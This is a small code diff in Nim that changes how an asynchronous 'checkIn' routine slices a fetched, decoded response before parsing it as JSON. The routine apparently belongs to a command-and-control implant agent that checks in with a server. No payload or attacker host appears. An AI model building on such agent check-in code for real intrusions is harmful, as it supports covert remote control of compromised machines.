@@ -55,7 +55,7 @@ proc checkIn: Future[bool] {.async.} =
         let temp = when defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
         when not defined(release):
             echo "decoded temp: ", temp
-        var resp = parseJson(temp[36 .. ^1])
+        var resp = parseJson(temp[36 .. ^2])
         when not defined(release):
             echo "resp from checkin: ", resp
         if(cmp(resp["status"].getStr(), "success") == 0):
